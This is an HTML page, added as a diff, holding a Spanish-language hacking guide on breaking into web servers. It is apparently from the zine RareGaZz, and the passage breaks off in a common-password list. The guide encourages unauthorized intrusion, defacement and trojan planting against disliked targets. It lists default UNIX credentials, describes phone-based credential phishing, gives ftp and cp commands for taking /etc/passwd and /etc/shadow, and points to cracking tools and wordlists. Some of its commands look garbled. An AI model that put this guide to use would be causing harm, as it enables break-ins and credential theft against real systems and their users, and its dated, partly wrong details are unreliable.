@@ -1,0 +1,778 @@
+<html>
+
+<head>
+<meta HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<meta NAME="Author" CONTENT="Gilligan">
+<meta NAME="GENERATOR" CONTENT="Microsoft FrontPage 3.0">
+<title>Guia para crackear Websites &amp; Homepages</title>
+</head>
+
+<body TEXT="#FFCC33" BGCOLOR="#00002D" LINK="#33FF33" VLINK="#FFFFCC" ALINK="#33FF33"
+style="background-image: url('fondochat.gif')">
+
+<p align="center"><font face="Courier" size="3">&nbsp; </font></p>
+<div align="center"><center>
+
+<table BORDER="1" BGCOLOR="#FFFFFF">
+  <tr ALIGN="CENTER">
+    <td><p align="center"><font COLOR="#FF0000" face="Courier" size="5"><b>&quot;Guia para
+    crackear Websites &amp; Homepages&quot;<br>
+    por Le PomPaItor</b></font></td>
+  </tr>
+</table>
+</center></div>
+
+<p align="center"><font face="Courier" size="3">&nbsp;</font></p>
+
+<p align="center"><font face="Courier" size="3">&quot;Lo espantoso no es la altura, sino
+la pendiente. La&nbsp;pendiente&nbsp;donde la mirada se precipita a lo hondo y
+la&nbsp;mano se extiende hacia la cumbre. Alli es donde se apodera del corazon el vertigo
+de su doble voluntad.&quot; -Federico Nietzsche</font></p>
+
+<p align="center"><font face="Courier" size="3">&nbsp;</font></p>
+
+<p align="left"><font face="Courier" size="3" COLOR="#33FF33"><b>&nbsp; 1. Introduccion</b></font><font
+face="Courier" size="3"> </font></p>
+
+<p align="left"><font face="Courier" size="3">Si alguna vez&nbsp;has&nbsp;hechado a volar
+tu imaginacion&nbsp;se te habra ocurrido que seria&nbsp; comico remover algunas graficas
+de algun website,&nbsp;o mejor aun borrar toda la pagina de algun enemigo para deleitarte
+con tu venganza.&nbsp;Pues bien, este es el manual que te ayudara a lograrlo. </font></p>
+
+<p align="left"><font face="Courier" size="3">Primero&nbsp; deberas&nbsp; entender que
+andar por ahi&nbsp; borrando paginas es *TONTO* e inmaduro. Lo que trato de hacer es que
+sientas la adrenalina de entrar a&nbsp;un sistema&nbsp; al que no
+estes&nbsp;autorizado&nbsp;y&nbsp;echar una ojeada alrededor.&nbsp;Si&nbsp;te dedicas a
+invadir&nbsp; sistemas y borrar&nbsp;archivos le&nbsp;quitaras&nbsp; el privilegio a otra
+persona de entrar a ese sistema ya que el operador se dara cuenta de la intrusion y
+aumentaran la seguridad negando asi la entrada a mas 'intrusos'. Si el sistema al que
+entraste pertenece a unos hijos de la chingada (Plantas Nucleares, Creadores de abrigos de
+piel, Agencias de Gobierno,etc) olvida lo antes dicho y haz que&nbsp; se arrepientan de
+haberse conectado a la red causando kaos o mejor aun, infectandolos con algun buen
+virus&nbsp; (por que no reemplazar un ejecutable por un caballo de troya?). En fin, usa tu
+cabeza y cuida de no ser sorprendido en tus viajes de kAoS. </font></p>
+
+<p align="center"><font COLOR="#33FF33" face="Courier" size="3"><b>&nbsp;</b></font></p>
+
+<p align="left"><font face="Courier" size="3" COLOR="#33FF33"><b>&nbsp; 2. Websites</b></font><font
+face="Courier" size="3"> </font></p>
+
+<p><font face="Courier" size="3">Un website es solamente una computadora llamada servidor
+por su capacidad de de&nbsp; realizar&nbsp;diferentes&nbsp;tareas
+al&nbsp;mismo&nbsp;tiempo,&nbsp;ejecutando&nbsp;un&nbsp;sistema operativo que generalmente
+sera UNIX o algunas de sus variaciones y con toda la informacion guardada en algun medio. <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3" COLOR="#33FF33">&nbsp; 2.1 Ganando acceso a un servidor
+WWW</font><font face="Courier" size="3"> </font></p>
+
+<p><font face="Courier" size="3">Aqui reside la magia del Hacker, la proteccion comun son
+dos preguntas Login y Password.&nbsp;El usuario que tenga una cuenta en ese servidor tiene
+un nombre de&nbsp; usuario&nbsp;(Login)&nbsp;y contrase¤a (Password)&nbsp;por lo que la
+entrada&nbsp;a&nbsp;ese servidor no tiene problemas;&nbsp;pero&nbsp;para una persona ajena
+a ese servidor la entrada es un poco mas complicada. </font></p>
+
+<p><font face="Courier" size="3">Para poder penetrar el sistema necesitamos saber su URL y
+una vez conectados con&nbsp; el explorador prestar atencion al mensaje&nbsp;waiting reply
+from 103.38.28 o algo parecido que haga aparecer una direccion IP en&nbsp;lugar de el
+nombre de dominio. </font></p>
+
+<p><font face="Courier" size="3">Si&nbsp;lograste&nbsp;conseguir&nbsp;la&nbsp;direccion IP
+usa telnet para conectarte&nbsp;a&nbsp;esa direccion.&nbsp;
+Si&nbsp;cuando&nbsp;tratas&nbsp;de conectarte aparece el mensaje 'connection refused'
+probablemente&nbsp;este protegida&nbsp;esa&nbsp;direccion con una FIREWALL.&nbsp;Si este
+es el caso trata de hacer telnet a el nombre de dominio con la finalidad de llegar a el
+frustrante LOGIN/PASSWORD. </font></p>
+
+<p><font face="Courier" size="3">Para&nbsp; entrar&nbsp; necesitas conseguir alguna cuenta
+haciendo algo de&nbsp;ingenieria social o intenta con los defaults. <br>
+&nbsp; <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">&nbsp;&nbsp; * CUENTAS DEFAULTS DE UNIX * </font></p>
+
+<p><font face="Courier" size="3">Login:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Password: </font></p>
+
+<p><font face="Courier" size="3">root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+root <br>
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+system <br>
+sys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sys <br>
+sys&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+system <br>
+daemon&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+daemon <br>
+uucp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+uucp <br>
+tty&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+tty <br>
+test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+test <br>
+unix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+unix <br>
+unix&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+test <br>
+bin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+bin <br>
+adm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+adm <br>
+adm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+admin <br>
+admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+adm <br>
+admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+admin <br>
+sysman&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sysman <br>
+sysman&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sys <br>
+sysman&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+system <br>
+sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sysadmin <br>
+sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sys <br>
+sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+system <br>
+sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+admin <br>
+sysadmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+adm <br>
+who&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+who <br>
+learn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+learn <br>
+uuhost&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+uuhost <br>
+guest&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+guest <br>
+host&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+host <br>
+nuucp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+nuucp <br>
+rje&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+rje <br>
+games&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+games <br>
+games&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+player <br>
+sysop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sysop <br>
+root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+sysop <br>
+demo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+demo <br>
+&nbsp; </font></p>
+
+<p align="left"><font face="Courier" size="3">Si&nbsp;fracasas al intentar el acceso
+usando cada uno de los anteriores logins, probablemente tengas que conseguir el password
+de otra manera como relaciones humanas; esto significa que vas a tener que conseguir la
+clave valiendote de trucos como hablar por telefono a una persona que sepas que
+esta&nbsp;registrada en ese servidor y pedirle su Login y Password diciendo que necesitas
+validar su cuenta o algo parecido. Otra manera de conseguir un Password es crear&nbsp; un
+programa que robe las claves de acceso del disco duro de una persona.</font></p>
+
+<p align="left"><font face="Courier" size="3"><br>
+&nbsp; <br>
+&nbsp; <font COLOR="#33FF33">3. Cuando se esta adentro</font> </font></p>
+
+<p><font face="Courier" size="3">Una vez que hayas logrado entrar a un sistema necesitaras
+localizar y obtener el archivo passwd disponible en el directorio /etc </font></p>
+
+<p><font face="Courier" size="3">Para obtener el archivo PASSWD usa el siguiente ejemplo: <br>
+($ simboliza el prompt UNIX) </font></p>
+
+<p><font face="Courier" size="3">$ ftp <br>
+FTP&gt; get /etc/passwd <br>
+FTP&gt; quit </font></p>
+
+<p><font face="Courier" size="3">Para ver el contenido de el archivo usa el siguiente
+comando: </font></p>
+
+<p><font face="Courier" size="3">$ cat /etc/passwd <br>
+&nbsp; <br>
+Una&nbsp;vez&nbsp;que tengas en tu posesion el archivo PASSWD editalo y fijate en su
+contenido, debera tener la siguiente informacion: </font></p>
+
+<p><font face="Courier" size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+usuario:contrase¤a:ID:Grupo:descripcion/nombre:directorio:shell </font></p>
+
+<p><font face="Courier" size="3">usuario&nbsp;&nbsp;&nbsp; - Este es el login de algun
+usuario. <br>
+contrase¤a - Es el password de el usuario (encriptada con DES) <br>
+ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - Es la identificacion de ese usuario. <br>
+grupo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - El grupo al que pertenece esta cuenta. <br>
+descripcion- El nombre del usuario. <br>
+directorio - El directorio de acceso de el usuario. <br>
+shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - El shell que procesa los comandos de ese usuario. </font></p>
+
+<p><font face="Courier" size="3">&nbsp;Un ejemplo podria ser: </font></p>
+
+<p><font face="Courier" size="3">&nbsp;&nbsp;&nbsp; john:234abc56:9999:13:John
+Johnson:/home/dir/john:/bin/john </font></p>
+
+<p><font face="Courier" size="3">Nombre de usuario: john <br>
+Password encriptado: 234abc56 <br>
+Usuario numero: 9999 <br>
+Numero de grupo: 13 <br>
+Descripcion: John Johnson <br>
+Directorio de acceso: /home/dir/john <br>
+Shell: /bin/john </font></p>
+
+<p><font face="Courier" size="3">Si el archivo que conseguiste contiene la misma
+informacion pero en el campo del password tiene un asterisco (*) o cualquier otro
+caracter, significa que las contrase¤as se encuentran 'sombreadas'. </font></p>
+
+<p><font face="Courier" size="3">Si las contraseñas se encuentra sombreada,las podras
+encontrar en el archivo shadow aunque generalmente no se puede tener acceso a ese archivo
+a menos de tener root.&nbsp; Una&nbsp;forma&nbsp;de&nbsp;conseguir SHADOW es usando el
+comando&nbsp;cp&nbsp;para copiarlo&nbsp;a&nbsp;otro archivo y&nbsp;despues tratar de
+obtener el archivo al que&nbsp;se copio, ejemplo: </font></p>
+
+<p><font face="Courier" size="3">$cp /etc/shadow /usuarios/carlos/hack.txt <br>
+$ftp <br>
+FTP&gt; get /usuarios/carlos/hack.txt <br>
+FTP&gt; quit <br>
+$rd /usuarios/carlos/hack.txt </font></p>
+
+<p><font face="Courier" size="3">Algunas otras maneras de obtener el archivo SHADOW seran
+explicadas en otros numeros de RareGaZz. <br>
+&nbsp; </font></p>
+
+<p><font face="Courier" size="3">Ya tengo los passwords encriptados, ahora que? </font></p>
+
+<p><font face="Courier" size="3">Los passwords estan encriptados usando one-way
+encription, significa que&nbsp; no se&nbsp; pueden&nbsp;des-encriptar.&nbsp;Lo que Unix
+hace es obtener&nbsp;la contraseña&nbsp;del usuario,la encripta y la compara con la que
+ya esta encriptada, si coinciden entonces se le permite el acceso. </font></p>
+
+<p><font face="Courier" size="3">Para poder obtener las contraseñas es necesario tener un
+archivo con palabras y usar un programa para que encripte las palabras del archivo&nbsp;y
+las compare con las contrase¤as encriptadas,si coinciden te avisa que palabra fue la que
+coincidio con la contrase¤a encriptada.</font></p>
+
+<p><font face="Courier" size="3"><br>
+Algunos programas de este tipo son: </font></p>
+
+<p><font face="Courier" size="3">Nombre&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Palabras por Segundo&nbsp;&nbsp;&nbsp; Computadora </font></p>
+
+<p><font face="Courier" size="3">John the
+Ripper&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+5077&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+586 <br>
+Starcracker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+1300&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+586 <br>
+Cracker Jack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+1008&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+586 <br>
+KillerCracker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+350&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+586 </font></p>
+
+<p><font face="Courier" size="3">Estos programas se encuentran disponibles en cualquier
+pagina de Hackers, si quieres la ultima version de StarCracker visita la siguiente URL: <a
+HREF="http://www.geocities.com/SiliconValley/park/8403/index.html">http://www.geocities.com/SiliconValley/park/8403/index.html</a>
+</font></p>
+
+<p><font face="Courier" size="3">Para conseguir listas de palabras haz FTP a el siguiente
+servidor: <br>
+warwick.ac.uk <br>
+directorio: /pub/cud </font></p>
+
+<p><font face="Courier" size="3">Algunas de las palabras mas usadas en contraseñas son: <br>
+&nbsp; <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+aaa&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+academia&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ada&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; adrian <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aerobics&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+airplane&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+albany&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; albatros <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; albert&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+alex&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+alexander&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; algebra <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alias&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+alisa&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+alpha&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alphabet <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ama&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+amy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+analog&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; anchor <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+andy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
